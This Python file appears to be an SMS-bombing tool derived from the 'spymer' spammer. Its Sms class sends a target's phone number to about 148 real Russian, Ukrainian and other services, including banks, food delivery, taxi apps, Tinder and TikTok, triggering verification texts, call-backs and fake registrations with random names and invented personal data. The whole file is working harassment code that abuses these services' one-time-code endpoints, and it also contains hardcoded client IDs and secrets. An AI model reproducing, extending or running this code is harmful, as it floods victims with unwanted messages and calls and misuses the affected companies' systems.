import requests, random, datetime
from random import randint

class Sms(object):
    
    all = 148
    author = "База от Spymer\nhttps://github.com/FSystem88/spymer/blob/master/spammer.py"
    
    def __init__(self):
        pass
    
    def mask(self, str, maska):
        if len(str) == maska.count('#'):
            str_list = list(str)
            for i in str_list:
                maska=maska.replace("#", i, 1)
        return maska

    def send(self, serv, phone):
        phone9 = phone[1:]
        name = ''
        for x in range(12):
            name = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            email = "{}@gmail.com".format(name)
        word = name
        
        if serv == 0: requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":self.mask(str=phone, maska="+# (###) ###-##-##"),"email":"","city":""})
        elif serv == 1: requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone})
        elif serv == 2: requests.post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code",data={"phone": self.mask(str=phone[1:], maska="8(###)###-##-##")})
        elif serv == 3: requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone})
        elif serv == 4: requests.post("https://yaponchik.net/login/login.php",data={"login": "Y","countdown": "0","step": "phone","redirect": "/profile/","phone": self.mask(str=phone, maska="+# (###) ###-##-##"), "code":""})
        elif serv == 5: requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone})
        elif serv == 6: requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone": phone})
        elif serv == 7: requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn": phone})
        elif serv == 8: requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName":"РёРІР°РЅРѕРІ","firstName":"РёРІР°РЅ","middleName":"РёРІР°РЅРѕРІРёС‡","mobilePhone":phone,"email":email,"smsCode":""})
        elif serv == 9: requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone})
        elif serv == 10: requests.post("https://b.utair.ru/api/v1/profile/", json={"phone":phone,"confirmationGDPRDate": int(str(datetime.datetime.now().timestamp()).split('.')[0]) })
        elif serv == 11: requests.post("https://b.utair.ru/api/v1/login/", json={"login":phone,"confirmation_type":"call_code"}) 
        # elif serv == 12: requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"action":"auth","phone":self.mask(str=phone, maska="#(###)###-##-##")})
        # elif serv == 13: requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"phone":self.mask(str=phone, maska="+#(###)###-##-##"),"action":"sendSmsAgain"})
        elif serv == 14: requests.post("https://uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone},)
        elif serv == 15: requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone})
        elif serv == 16: requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",json={"doc": {"auth": {"mphone": "+" + phone,"bdate": "11.11.1999","deviceid": "00100","version": "1.0","source": "site","signature": "undefined",}}},headers={"Accept": "application/json"})
        elif serv == 17: requests.post("https://www.top-shop.ru/login/loginByPhone/",data={"phone": self.mask(str=phone, maska="+# (###) ###-##-##")})
        elif serv == 18: requests.post("https://topbladebar.ru/user_account/ajax222.php?do=sms_code",data={"phone": self.mask(str=phone, maska="8(###)###-##-##")})
        elif serv == 19: requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number": phone})
        elif serv == 20: requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}})
        elif serv == 21: requests.post("https://thehive.pro/auth/signup", json={"phone": "+"+phone})
        elif serv == 22: requests.post("https://msk.tele2.ru/api/validation/number/"+phone, json={"sender": "Tele2"},)
        elif serv == 23: requests.post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php",data={"RECALL": "Y", "BACK_CALL_PHONE": phone})
        elif serv == 24: requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php",data={"action": "callback_phonenumber", "phone": phone})
        elif serv == 25: requests.post("https://www.tanuki.ru/api/",json={"header": {"version": "2.0","userId": f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}","agent": {"device": "desktop", "version": "undefined undefined"},"langId": "1","cityId": "9",},"method": {"name": "sendSmsCode"},"data": {"phone": self.mask(str=phone, maska="(+#)##########"), "type": 1}})
        elif serv == 26: requests.post("https://lk.tabris.ru/reg/", data={"action": "phone", "phone": phone})
        elif serv == 27: requests.post("https://tabasko.su/",data={"IS_AJAX": "Y","COMPONENT_NAME": "AUTH","ACTION": "GET_CODE","LOGIN": phone,})
        elif serv == 28: requests.post("https://www.sushi-profi.ru/api/order/order-call/",json={"phone": phone9, "name": name},)
        elif serv == 29: requests.post("https://client-api.sushi-master.ru/api/v1/auth/init",json={"phone": phone})
        elif serv == 30: requests.post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code",data={"phone": self.mask(str=phone9, maska="8(###)###-##-##")})
        elif serv == 31: requests.post("http://sushigourmet.ru/auth",data={"phone": self.mask(str=phone9, maska="8 (###) ###-##-##"), "stage": 1})
        elif serv == 32: requests.post("https://sushifuji.ru/sms_send_ajax.php",data={"name": "false", "phone": phone})
        # elif serv == 33: requests.get("https://auth.pizza33.ua/ua/join/check/",params={"callback": "angular.callbacks._1","email": email,"word": word,"phone": phone9,"utm_current_visit_started": 0,"utm_first_visit": 0,"utm_previous_visit": 0,"utm_times_visited": 0})
        elif serv == 34: requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone},)
        elif serv == 35: requests.get("https://suandshi.ru/mobile_api/register_mobile_user",params={"phone": phone,},)
        elif serv == 36: requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "registration","tpl": "restore_word","phone": self.mask(str=phone9, maska="8-###-###-##-##")})
        elif serv == 37: requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone})
        elif serv == 38: requests.get("https://www.sportmaster.ru/user/session/sendSmsCode.do", params={"phone": self.mask(str=phone, maska="+# (###) ###-##-##")})
        elif serv == 39: requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",data={"demo_number": "+" + phone, "ajax_demo_send": "1"})
        elif serv == 40: requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+"+phone, "action": "confirm_mobile"})
        elif serv == 41: requests.post("https://shopandshow.ru/sms/word-request/",data={"phone": "+"+phone, "resend": 0})
        elif serv == 42: requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "RegistrationSendSms","variables": {"phoneNumber": "+"+phone},"query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",})
        elif serv == 43: requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "sendResetwordSms","variables": {"phoneNumber": "+"+phone},"query": "mutation sendResetwordSms($phoneNumber: String!) {\n  resetwordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n"})
        elif serv == 44: requests.post("https://sayoris.ru/?route=parse/whats", data={"phone": phone})
        elif serv == 45: requests.post("https://api.saurisushi.ru/Sauri/api/v2/auth/login",data={"data": {"login":phone9,"check":True,"crypto":{"captcha":"739699"}}})
        elif serv == 46: requests.post("https://.rutube.ru/api/accounts/phone/send-word/",json={"phone": "+"+phone})
        elif serv == 47: requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"},)
        elif serv == 48: requests.post("https://rieltor.ua/api/users/register-sms/",json={"phone": phone, "retry": 0},)
        elif serv == 49: requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php",data={"phone": "+"+phone})
        elif serv == 50: requests.post("https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/",data={"phone": self.mask(str=phone, maska="+#(###)###-##-##"), "alien": "0"})
        elif serv == 51: requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",params={"number": phone})
        elif serv == 52: requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": phone})
        elif serv == 53: requests.get("https://sso.cloud.qlean.ru/http/users/requestotp",headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},params={"phone": phone,"clientId": "undefined","sessionId": str(randint(5000, 9999))})
        elif serv == 54: requests.post("https://www.prosushi.ru/php/profile.php",data={"phone": "+"+phone, "mode": "sms"})
        elif serv == 55: requests.post("https://api.pozichka.ua/v1/registration/send",json={"RegisterSendForm": {"phone": self.mask(str=phone, maska="+#-###-###-##-##")}})
        elif serv == 56: requests.post("https://butovo.pizzapomodoro.ru/ajax/user/auth.php",data={"AUTH_ACTION": "SEND_USER_CODE","phone": self.mask(str=phone, maska="+# (###) ###-##-##")})
        elif serv == 57: requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",data={"phone": self.mask(str=phone, maska="+# (###) ###-##-##")})
        elif serv == 58: requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": phone})
        elif serv == 59: requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "call_me","task": "request_call","name": name,"phone": self.mask(str=phone9, maska="8-###-###-##-##")})
        elif serv == 60: requests.post("https://pizzasinizza.ru/api/phoneCode.php", json={"phone": phone9})
        elif serv == 61: requests.post("https://pizzakazan.com/auth/ajax.php",data={"phone": "+"+phone, "method": "sendCode"})
        elif serv == 62: requests.post("https://pizza46.ru/ajaxGet.php",data={"phone": self.mask(str=phone, maska="+# (###) ###-####")})
        elif serv == 63: requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": "+"+phone},)
        elif serv == 64: requests.post("https://paylate.ru/registry",data={"mobile": self.mask(str=phone, maska="+#-###-###-##-##"),"first_name": name,"last_name": name,"nick_name": name,"gender-client": 1,"email": email,"action": "registry"})
        elif serv == 65: requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",data={"telephone": "8"+phone9})
        elif serv == 66: requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": phone, "otpId": 0})
        elif serv == 67: requests.post("https://www.osaka161.ru/local/tools/webstroy.webservice.php",data={"name": "Auth.Sendword","params[0]": self.mask(str=phone, maska="+# (###) ###-####")})
        elif serv == 68: requests.post("https://ontaxi.com.ua/api/v2/web/client",json={"country": "UA","phone": phone[3:]})
        elif serv == 69: requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": phone})
        elif serv == 70: requests.post("https://www.ollis.ru/gql", json={{"query":"mutation { phone(number:\""+phone+"\", locale:ru) { token error { code message } } }"}})
        # elif serv == 71: requests.get("https://okeansushi.ru/includes/contact.php",params={"call_mail": "1","ajax": "1","name": name,"phone": self.mask(str=phone9, maska="8 (###) ###-##-##"),"call_time": "1","pravila2": "on"})
        elif serv == 72: requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+"+phone})
        elif serv == 73: requests.post("https://nn-card.ru/api/1.0/covid/login", json={"phone": phone})
        # elif serv == 74: requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": phone,"registration": "N"})
        elif serv == 75: requests.post("https://www.niyama.ru/ajax/sendSMS.php",data={"REGISTER[PERSONAL_PHONE]": phone,"code": "","sendsms": "Р’С‹СЃР»Р°С‚СЊ РєРѕРґ"})
        elif serv == 76: requests.post("https://account.my.games/signup_send_sms/", data={"phone": phone})
        elif serv == 77: requests.post("https://auth.multiplex.ua/login", json={"login": phone})
        elif serv == 78: requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": phone})
        elif serv == 79: requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": phone,"email": email})
        elif serv == 80: requests.post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php",data={"name": name, "phone": phone})
        elif serv == 81: requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+"+phone},)
        elif serv == 82: requests.post("https://moneyman.ru/registration_api/actions/send-confirmation-code",data="+"+phone)
        elif serv == 83: requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",json={"FirstName": name, "CellPhone": phone, "Package": "optimal"})
        elif serv == 84: requests.post("https://mobileplanet.ua/register",data={"klient_name": name,"klient_phone": "+"+phone,"klient_email": email})
        elif serv == 85: requests.get(f"http://mnogomenu.ru/office/word/reset/"+self.mask(str=phone, maska="+# (###) ### ## ##"))
        elif serv == 86: requests.get("https://my.mistercash.ua/ru/send/sms/registration",params={"number": "+"+phone})
        elif serv == 87: requests.get("https://menza-cafe.ru/system/call_me.php",params={"fio": name, "phone": phone, "phone_number": "1"})
        elif serv == 88: requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": phone,"user_info[email]": email,"user_info[word]": word,"user_info[conf_word]": word})
        elif serv == 89: requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",data={"phone": phone, "do": "phone"})
        elif serv == 90: requests.get("https://makimaki.ru/system/callback.php",params={"cb_fio": name,"cb_phone": self.mask(str=phone, maska="+# ### ### ## ##")})
        elif serv == 91: requests.post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",data={"data": phone, "metod": "postreg"})
        elif serv == 92: requests.post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code",json={"phone": phone},headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9"})
        elif serv == 93: requests.post("https://loany.com.ua/funct/ajax/registration/code",data={"phone":phone})
        elif serv == 94: requests.post("https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle",json={"url": "/api/client/phone_verification","method": "POST","data": {"client_id": 5646981, "phone": phone, "alisa_id": 1},"headers": {"Client-Id": 5646981,"Content-Type": "application/x-www-form-urlencoded"}})
        elif serv == 95: requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": "+"+phone})
        elif serv == 96: requests.post("https://koronapay.com/transfers/online/api/users/otps",data={"phone": phone})
        elif serv == 97: requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms",headers={"Agent": "website"},json={"Phone":phone, "Type": 1})
        elif serv == 98: requests.post("https://kilovkusa.ru/ajax.php",params={"block": "auth", "action": "send_register_sms_code", "data_type": "json"},data={"phone": self.mask(str=phone, maska="# (###) ###-##-##")})
        elif serv == 99: requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+"+phone})
        # elif serv == 100: requests.post("https://kaspi.kz/util/send-app-link", data={"address": phone9})
        # elif serv == 101: requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": phone})
        elif serv == 102: requests.post("https://izi.ua/api/auth/register",json={"phone": "+"+phone,"name": name,"is_terms_accepted": True})
        elif serv == 103: requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+"+phone})
        elif serv == 104: requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone":phone})
        elif serv == 105: requests.post("https://iqlab.com.ua/session/ajaxregister",data={"cellphone": self.mask(str=phone, maska="+## (###) ###-##-##")})
        elif serv == 106: requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByword",data={"word": word,"application": "lkp","login": "+"+phone})
        elif serv == 107: requests.post("https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999),"DocSeries": randint(5000, 9999),"FirstName": name,"Gender": "M","LastName": name,"SecondName": name,"Phone": phone9,"Email": email})
        # elif serv == 108: requests.post("https://informatics.yandex/api/v1/registration/confirmation/phone/send/",data={"country": "RU","csrfmiddlewaretoken": "","phone": phone})
        elif serv == 109: requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request","phone": "+"+phone,"phone_permission": "unknown","stream_id": 0,"v": 3,"appversion": "3.20.6","osversion": "unknown","devicemodel": "unknown"})
        elif serv == 110: requests.post("https://api.imgur.com/account/v1/phones/verify",json={"phone_number": phone, "region_code": "RU"})
        elif serv == 111: requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"})
        elif serv == 112: requests.get("https://api.hmara.tv/stable/entrance", params={"contact": phone})
        elif serv == 113: requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": phone, "platform": "PISWeb"})
        elif serv == 114: requests.post("https://www.hatimaki.ru/register/",data={"REGISTER[LOGIN]": phone,"REGISTER[PERSONAL_PHONE]": phone,"REGISTER[SMS_CODE]": "","resend-sms": "1","REGISTER[EMAIL]": "","register_submit_button": "Р—Р°СЂРµРіРёСЃС‚СЂРёСЂРѕРІР°С‚СЊСЃСЏ"})
        elif serv == 115: requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": phone9}},)
        elif serv == 116: requests.post("https://crm.getmancar.com.ua/api/veryfyaccount",json={"phone": "+"+phone,"grant_type": "word","client_id": "gcarAppMob","client_secret": "SomeRandomCharsAndNumbersMobile"})
        # elif serv == 117: requests.post("https://friendsclub.ru/assets/components/pl/connector.php",data={"casePar": "authSendsms", "MobilePhone": "+"+phone})
        elif serv == 118: requests.post("https://foodband.ru/api?call=calls",data={"customerName": name,"phone": self.mask(str=phone, maska="+# (###) ###-##-##"),"g-recaptcha-response": ""})
        elif serv == 119: requests.get("https://foodband.ru/api/",params={"call": "customers/sendVerificationCode","phone": phone9,"g-recaptcha-response": ""})
        elif serv == 120: requests.post("https://www.flipkart.com/api/5/user/otp/generate",headers={"Origin": "https://www.flipkart.com","X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},data={"loginId": "+"+phone})
        elif serv == 121: requests.post("https://www.flipkart.com/api/6/user/signup/status",headers={"Origin": "https://www.flipkart.com","X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},json={"loginId": "+"+phone, "supportAllStates": True})
        elif serv == 122: requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+"+phone})
        elif serv == 123: requests.get("https://findclone.ru/register", params={"phone": "+"+phone})
        elif serv == 124: requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"phone": "+"+phone})
        elif serv == 125: requests.post("https://2407.smartomato.ru/account/session",json={"phone": self.mask(str=phone, maska="+# (###) ###-##-##"),"g-recaptcha-response": None})
        elif serv == 126: requests.post("https://www.etm.ru/cat/runprog.html",data={"m_phone":phone9,"mode": "sendSms","syf_prog": "clients-services","getSysParam": "yes"})
        elif serv == 127: requests.get("https://api.eldorado.ua/v1/sign/",params={"login": phone,"step": "phone-check","fb_id": "null","fb_token": "null","lang": "ru"})
        elif serv == 128: requests.post("https://e-groshi.com/online/reg",data={"first_name": name,"last_name": name,"third_name": name,"phone": self.mask(str=phone, maska="+## (###) ###-##-##"),"word": word,"word2": word})
        elif serv == 129: requests.post("https://vladimir.edostav.ru/site/CheckAuthLogin",data={"phone_or_email": "+"+phone})
        elif serv == 130: requests.post("https://api.easypay.ua/api/auth/register",json={"phone": phone, "word": word})
        elif serv == 131: requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": phone})
        elif serv == 132: requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3})
        elif serv == 133: requests.post("https://api.creditter.ru/confirm/sms/send",json={"phone": self.mask(str=phone, maska="+# (###) ###-##-##"),"type": "register"})
        elif serv == 134: requests.post("https://clients.cleversite.ru/callback/run.php",data={"siteid": "62731","num":phone,"title": "РћРЅР»Р°Р№РЅ-РєРѕРЅСЃСѓР»СЊС‚Р°РЅС‚","referrer": "https://m.cleversite.ru/call"})
        elif serv == 135: requests.post("https://city24.ua/personalaccount/account/registration",data={"PhoneNumber": phone})
        elif serv == 136: requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/")
        elif serv == 137: requests.post("https://cinema5.ru/api/phone_code",data={"phone": self.mask(str=phone, maska="+# (###) ###-##-##")})
        elif serv == 138: requests.post("https://api.cian.ru/sms/v1/send-validation-code/",json={"phone": "+"+phone, "type": "authenticateCode"})
        elif serv == 139: requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone","variables": {"phone": phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
        elif serv == 140: requests.get("https://it.buzzolls.ru:9995/api/v2/auth/register",params={"phoneNumber": "+"+phone,},headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3"})
        elif serv == 141: requests.post("https://bluefin.moscow/auth/register/",data={"phone": self.mask(str=phone9, maska="(###)###-##-##"), "sendphone": "Р”Р°Р»РµРµ"})
        elif serv == 142: requests.post("https://app.benzuber.ru/login", data={"phone": "+"+phone})
        elif serv == 143: requests.post("https://bartokyo.ru/ajax/login.php",data={"user_phone": self.mask(str=phone, maska="+# (###) ###-##-##")})
        elif serv == 144: requests.post("https://bamper.by/registration/?step=1",data={"phone": "+"+phone,"submit": "Р—Р°РїСЂРѕСЃРёС‚СЊ СЃРјСЃ РїРѕРґС‚РІРµСЂР¶РґРµРЅРёСЏ","rules": "on"})
        elif serv == 145: requests.get("https://avtobzvon.ru/request/makeTestCall",params={"to": self.mask(str=phone9, maska="(###) ###-##-##")})
        elif serv == 146: requests.post("https://oauth.av.ru/check-phone",json={"phone": self.mask(str=phone, maska="+# (###) ###-##-##")})
        elif serv == 147: requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone})
        elif serv == 148: requests.post("https://apteka.ru/_action/auth/getForm/",data={"form[NAME]": "","form[PERSONAL_GENDER]": "","form[PERSONAL_BIRTHDAY]": "","form[EMAIL]": "","form[LOGIN]": self.mask(str=phone, maska="+# (###) ###-##-##"),"form[WORD]": word,"get-new-word": "РџРѕР»СѓС‡РёС‚Рµ РїР°СЂРѕР»СЊ РїРѕ SMS","user_agreement": "on","personal_data_agreement": "on","formType": "simple","utc_offset": "120"})
        else: print("Ошибка сервиса")
